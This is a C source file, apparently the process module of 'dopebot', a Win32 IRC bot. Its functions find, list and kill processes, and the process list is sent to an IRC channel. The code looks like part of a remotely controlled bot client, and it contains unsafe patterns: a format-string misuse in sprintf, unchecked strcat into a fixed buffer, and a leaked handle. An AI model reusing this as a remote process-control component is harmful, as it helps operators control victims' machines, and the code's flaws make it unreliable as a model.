/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef NO_PROCESS
#include "bot.h"

//Get Process PID
DWORD get_pid(char *szExe)
{
	char szProc[LOWBUF];
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;

#ifndef NO_DEBUG
		printf("[DEBUG] Getting process id, get_pid()...\n");
#endif

		hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		pe32.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hProcessSnap, &pe32))
	{
		CloseHandle(hProcessSnap);
		return 0;
	}
	do
	{
			sprintf(szProc, pe32.szExeFile);
			PathStripPath(szProc);
		if (lstrcmpi(szProc, szExe) == 0)
		{
			return (pe32.th32ProcessID);
			break;
		}
	} 
	while (Process32Next(hProcessSnap, &pe32));
		CloseHandle(hProcessSnap);
		return 0;
}

//List Running Processes
void list_process(bool bSilent, SOCKET bsock, char *szAction, char *szDestination)
{
	char szProc[LOWBUF], szBuffer[IRCBUF], szBuff[1024];
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;

#ifndef NO_DEBUG
		printf("[DEBUG] Listing processes, list_process()...\n");
#endif

		hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		pe32.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hProcessSnap, &pe32))
	{
			CloseHandle(hProcessSnap);
			return;
	}
		memset(szBuff, 0, sizeof(szBuff));
	do
	{
				sprintf(szProc, pe32.szExeFile);
				PathStripPath(szProc);
				strcat(szBuff, szProc);
				strcat(szBuff, ", ");
	} 
	while (Process32Next(hProcessSnap, &pe32));
		CloseHandle(hProcessSnap);
		memset(szBuffer, 0, sizeof(szBuffer));
		memcpy(szBuffer, szBuff, 420);
	if (!bSilent) irc_msg(bsock, szAction, szDestination, szBuffer);
		memset(szBuffer, 0, sizeof(szBuffer));
		memcpy(szBuffer, szBuff + 420, 420);
	if (!bSilent) irc_msg(bsock, szAction, szDestination, szBuffer);
		return;
}

//Kill Process
bool kill_process(char *szProcess)
{
	char szProc[LOWBUF];
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;

#ifndef NO_DEBUG
		printf("[DEBUG] Killing process, kill_process()...\n");
#endif

		hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		pe32.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hProcessSnap, &pe32))
	{
			CloseHandle(hProcessSnap);
			return FALSE;
	}
	do
	{
			memset(szProc, 0, sizeof(szProc));
			sprintf(szProc, pe32.szExeFile);
			PathStripPath(szProc);
		if (lstrcmpi(szProcess, szProc) == 0)
		{
			if (TerminateProcess(OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID), 0) == 0)
			{
					CloseHandle(hProcessSnap);
					return FALSE;
			}
		}
	} 
	while (Process32Next(hProcessSnap, &pe32));
		CloseHandle(hProcessSnap);
		return TRUE;
}
#endif